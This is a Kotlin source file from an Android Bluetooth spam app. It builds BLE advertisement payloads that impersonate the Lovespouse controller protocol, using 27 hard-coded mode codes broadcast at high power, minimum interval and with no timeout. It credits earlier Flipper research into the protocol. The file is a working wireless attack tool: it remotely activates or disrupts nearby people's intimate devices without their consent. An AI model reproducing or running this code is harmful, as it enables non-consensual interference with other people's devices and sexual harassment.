package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.le.AdvertisingSetParameters
import android.util.Log
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingCallback
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Constants.Constants
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertiseMode
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetRange
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetType
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementTarget
import de.simon.dankelmann.bluetoothlespam.Enums.PrimaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.SecondaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.TxPowerLevel
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers.Companion.toHexString
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import de.simon.dankelmann.bluetoothlespam.Models.ManufacturerSpecificData
import kotlin.random.Random

class LovespousePlayAdvertisementSetGenerator:IAdvertisementSetGenerator {

    // Reversed from here: https://github.com/Flipper-XFW/Xtreme-Apps/blob/cb38588d1b6dc775e41af99625dc369b665ebe53/ble_spam/protocols/lovespouse.c
    // Discovered by @mandomat
    // Blog post at https://mandomat.github.io/2023-11-13-denial-of-pleasure/

    private val _logTag = "LovespousePlayAdvertisementSetGenerator"

    val lovespousePlays = mapOf(
        "E49C6C" to "Classic 1",
        "E7075E" to "Classic 2",
        "E68E4F" to "Classic 3",
        "E1313B" to "Classic 4",
        "E0B82A" to "Classic 5",
        "E32318" to "Classic 6",
        "E2AA09" to "Classic 7",
        "ED5DF1" to "Classic 8",
        "ECD4E0" to "Classic 9",
        "D41F5D" to "Independent 1-1",
        "D7846F" to "Independent 1-2",
        "D60D7E" to "Independent 1-3",
        "D1B20A" to "Independent 1-4",
        "D0B31B" to "Independent 1-5",
        "D3A029" to "Independent 1-6",
        "D22938" to "Independent 1-7",
        "DDDEC0" to "Independent 1-8",
        "DC57D1" to "Independent 1-9",
        "A4982E" to "Independent 2-1",
        "A7031C" to "Independent 2-2",
        "A68A0D" to "Independent 2-3",
        "A13579" to "Independent 2-4",
        "A0BC68" to "Independent 2-5",
        "A3275A" to "Independent 2-6",
        "A2AE4B" to "Independent 2-7",
        "AD59B3" to "Independent 2-8",
        "ACD0A2" to "Independent 2-9",
    )

    private val _manufacturerId = Constants.MANUFACTURER_ID_TYPO_PRODUCTS

    override fun getAdvertisementSets(inputData: Map<String, String>?): List<AdvertisementSet> {
        var advertisementSets: MutableList<AdvertisementSet> = mutableListOf()

        val data = inputData ?: lovespousePlays

        data.forEach { lovespousePlay ->
            var advertisementSet = AdvertisementSet()
            advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_LOVESPOUSE
            advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_LOVESPOUSE_PLAY
            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_FAR

            // Advertise Settings
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = false
            advertisementSet.advertiseSettings.timeout = 0

            // Advertising Parameters
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
            advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            // Phy is only used in non Legacy Mode
            advertisementSet.advertisingSetParameters.primaryPhy = PrimaryPhy.PHY_LE_CODED
            advertisementSet.advertisingSetParameters.secondaryPhy = SecondaryPhy.PHY_LE_CODED
            advertisementSet.advertisingSetParameters.scanable = true
            advertisementSet.advertisingSetParameters.connectable = false

            // AdvertiseData
            advertisementSet.advertiseData.includeDeviceName = false

            val manufacturerSpecificData = ManufacturerSpecificData()
            manufacturerSpecificData.manufacturerId = _manufacturerId
            var lovespousePrefix = "FFFF006DB643CE97FE427C"
            var lovespouseAppendix = "03038FAE"

            var payload = lovespousePrefix + lovespousePlay.key + lovespouseAppendix

            manufacturerSpecificData.manufacturerSpecificData = StringHelpers.decodeHex(payload)

            advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
            advertisementSet.advertiseData.includeTxPower = false

            // Scan Response
            //advertisementSet.scanResponse.includeTxPower = false

            // General Data
            advertisementSet.title = lovespousePlay.value

            // Callbacks
            advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GenericAdvertisingCallback()

            advertisementSets.add(advertisementSet)
        }

        return advertisementSets
    }
}